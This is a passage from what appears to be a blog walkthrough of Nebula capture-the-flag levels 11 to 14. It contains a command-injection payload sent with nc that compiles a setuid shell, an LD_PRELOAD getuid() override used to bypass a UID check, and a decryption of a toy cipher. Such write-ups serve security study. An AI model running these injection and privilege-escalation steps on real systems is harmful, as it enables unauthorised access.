</span><span class='line'>      <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define CL &quot;Content-Length: &quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;reading from stdin&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">CL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;invalid header&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">length</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread length&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">blue</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">pink</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">fd</span> <span class="o">=</span> <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">while</span><span class="p">(</span><span class="n">blue</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;blue = %d, length = %d, &quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>          <span class="n">pink</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;pink = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">pink</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread fail(blue = %d, length = %d)&quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>          <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>          <span class="n">blue</span> <span class="o">-=</span> <span class="n">pink</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;mmap&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">process</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute <code>getflag</code> so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(</p>

<h2>level12</h2>

<p><a href="https://exploit-exercises.com/nebula/level12/">Level12&rsquo;s Description</a>:</p>

<blockquote><p>There is a backdoor process listening on port 50001.</p></blockquote>


<p>With the description we are provided with the source code of a small Lua program:</p>

<figure class='code'><figcaption><span>level12.lua</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="kd">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">socket&quot;</span><span class="p">)</span>
</span><span class='line'><span class="kd">local</span> <span class="n">server</span> <span class="o">=</span> <span class="nb">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">50001</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span><span class='line'>  <span class="n">prog</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">echo &quot;</span><span class="o">..</span><span class="n">password</span><span class="o">..</span><span class="s2">&quot;</span><span class="s"> | sha1sum&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">r&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">prog</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">*all&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">prog</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span> <span class="k">do</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">:</span><span class="n">accept</span><span class="p">()</span>
</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Password: &quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">line</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">client</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span>
</span><span class='line'>  <span class="k">if</span> <span class="ow">not</span> <span class="n">err</span> <span class="k">then</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">trying &quot;</span> <span class="o">..</span> <span class="n">line</span><span class="p">)</span> <span class="c1">-- log from where ;\</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="n">h</span> <span class="o">~=</span> <span class="s2">&quot;</span><span class="s">4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span class="k">then</span>
</span><span class='line'>          <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Better luck next time</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>          <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Congrats, your token is 413**CARRIER LOST**</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>This level had another very obvious command injection vulnerability on the line where a <code>password</code> variable is piped through <code>sha1sum</code>. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a <code>;</code> character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.</p>

<p>So, to solve level12:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level12@nebula:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;;gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#&quot;</span> <span class="p">|</span> nc 127.0.0.1 50001
</span><span class='line'>Password: Better luck next <span class="nb">time</span>
</span><span class='line'>
</span><span class='line'>level12@nebula:~<span class="nv">$ </span>/var/tmp/flag12
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span><span class='line'>sh-4.2<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>level13</h2>

<p><a href="https://exploit-exercises.com/nebula/level13/">Level13&rsquo;s Description</a>:</p>

<blockquote><p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p></blockquote>


<p>With the description we are provided with the source code of a small C program:</p>

<figure class='code'><figcaption><span>level13_safe.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="o">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">#</span><span class="n">define</span> <span class="n">FAKEUID</span> <span class="mi">1000</span>
</span><span class='line'>
</span><span class='line'><span class="n">int</span> <span class="n">main</span><span class="p">(</span><span class="n">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">int</span> <span class="n">c</span><span class="p">;</span>
</span><span class='line'>  <span class="n">char</span> <span class="n">token</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="err">!</span><span class="o">=</span> <span class="n">FAKEUID</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Security failure detected. UID %d started us, we expect %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">FAKEUID</span><span class="p">);</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">The system administrators will be notified of this violation</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">//</span> <span class="n">snip</span><span class="p">,</span> <span class="n">sorry</span> <span class="p">:)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">your token is %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This level had me researching for quite some time. I came to learn of ELF DSO&rsquo;s and <code>LD_PRELOAD</code>. Basically, it is possible to have the dynamic linker preload shared libraries from the <code>LD_PRELOAD</code> environment variable that may allow for some functions to be modified. <a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">This</a> article contained most of the magic that was needed to get this level done.</p>

<p>I decided to &lsquo;override&rsquo; the <code>getuid()</code> function so that it would return the value of the <code>FAKEUID</code> constant in the program, instead of the value the real <code>getuid()</code> would have returned. For that to happen, I looked up the arguments for <code>getuid()</code> from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous <code>-shared -fPIC</code> arguments for position independent code and exported the <code>LD_PRELOAD</code> variable prior to running the binary.</p>

<p>One important thing to note here is that this &lsquo;hack&rsquo; has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the <code>LD_PRELOAD</code> environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override <code>getuid()</code>.</p>

<p>So, to solve level13:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level13@nebula:/var/tmp<span class="nv">$ </span>cp ~flag13/flag13 .
</span><span class='line'>
</span><span class='line'>level13@nebula:/var/tmp<span class="nv">$ </span>cat fake_getuid.c
</span><span class='line'><span class="c">#include&lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'>uid_t getuid<span class="o">(</span>void<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">return </span>1000<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>level13@nebula:/var/tmp<span class="nv">$ </span>gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o
</span><span class='line'>
</span><span class='line'>level13@nebula:/var/tmp<span class="nv">$ LD_PRELOAD</span><span class="o">=</span>/var/tmp/fake_getuid.o ./flag13
</span><span class='line'>your token is b705702b-76a8-42b0-8844-3adabbe5ac58
</span><span class='line'>
</span><span class='line'>level13@nebula:/var/tmp<span class="nv">$ </span>su - flag13
</span><span class='line'>Password:
</span><span class='line'>flag13@nebula:~<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level14</h2>

<p><a href="https://exploit-exercises.com/nebula/level14/">Level14&rsquo;s Description</a>:</p>

<blockquote><p>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p></blockquote>


<p>Logged in as user <code>level14</code>, we see 2 files in the <code>flag14</code> directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level14@nebula:~<span class="nv">$ </span><span class="nb">cd</span> ~flag14
</span><span class='line'>level14@nebula:/home/flag14<span class="nv">$ </span>ls -lh
</span><span class='line'>total 8.0K
</span><span class='line'>-rwsr-x--- 1 flag14  level14 7.2K 2011-12-05 18:59 flag14
</span><span class='line'>-rw------- 1 level14 level14   37 2011-12-05 18:59 token
</span><span class='line'>
</span><span class='line'>level14@nebula:/home/flag14<span class="nv">$ </span>cat token
</span><span class='line'>857:g67?5ABBo:BtDA?tIvLDKL<span class="o">{</span>MQPSRQWW.
</span></code></pre></td></tr></table></div></figure>


<p><code>token</code> obviously being the target to decrypt. Running <code>flag14</code> tells us that it is expecting a <code>-e</code> flag to encrypt. So, I tested the encryption to see how it behaves:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level14@nebula:/home/flag14<span class="nv">$ </span>./flag14 -e
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>ABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="o">[</span><span class="se">\]</span>^<span class="o">(</span>
</span></code></pre></td></tr></table></div></figure>


<p>What immediately jumped out at me was the A&rsquo;s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="c"># exploit-exercises level14 cryptor</span>
</span><span class='line'>
</span><span class='line'><span class="n">string</span> <span class="o">=</span> <span class="s">&#39;AABBCCDDEEFFGG&#39;</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">result</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;String: {s}</span><span class="se">\n</span><span class="s">Strlen: {l}</span><span class="se">\t</span><span class="s">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">s</span> <span class="o">=</span> <span class="n">string</span><span class="p">,</span> <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Key: {key}</span><span class="se">\t</span><span class="s"> Char: {char}</span><span class="se">\t</span><span class="s"> Ord: {ord}</span><span class="se">\t</span><span class="s"> Res: {res}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
</span><span class='line'>        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">,</span> <span class="n">char</span> <span class="o">=</span> <span class="n">char</span><span class="p">,</span> <span class="nb">ord</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="n">res</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Result: {res}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">res</span> <span class="o">=</span> <span class="n">result</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this meant that the output would be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>~ # python crypt.py
</span><span class='line'>String: AABBCCDDEEFFGG
</span><span class='line'>Strlen: 14
</span><span class='line'>Key: 0   Char: A     Ord: 65     Res: A
</span><span class='line'>Key: 1   Char: A     Ord: 65     Res: B
</span><span class='line'>Key: 2   Char: B     Ord: 66     Res: D
</span><span class='line'>Key: 3   Char: B     Ord: 66     Res: E
</span><span class='line'>Key: 4   Char: C     Ord: 67     Res: G
</span><span class='line'>Key: 5   Char: C     Ord: 67     Res: H
</span><span class='line'>Key: 6   Char: D     Ord: 68     Res: J
</span><span class='line'>Key: 7   Char: D     Ord: 68     Res: K
</span><span class='line'>Key: 8   Char: E     Ord: 69     Res: M
</span><span class='line'>Key: 9   Char: E     Ord: 69     Res: N
</span><span class='line'>Key: 10  Char: F     Ord: 70     Res: P
</span><span class='line'>Key: 11  Char: F     Ord: 70     Res: Q
</span><span class='line'>Key: 12  Char: G     Ord: 71     Res: S
</span><span class='line'>Key: 13  Char: G     Ord: 71     Res: T
</span><span class='line'>
</span><span class='line'>Result: ABDEGHJKMNPQST
</span></code></pre></td></tr></table></div></figure>


<p>The same string was checked using the <code>flag14</code> cryptor:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level14@nebula:/home/flag14<span class="nv">$ </span>./flag14 -e
</span><span class='line'>AABBCCDDEEFFGG
</span><span class='line'>ABDEGHJKMNPQST
</span></code></pre></td></tr></table></div></figure>


<p>A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the <code>token</code> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
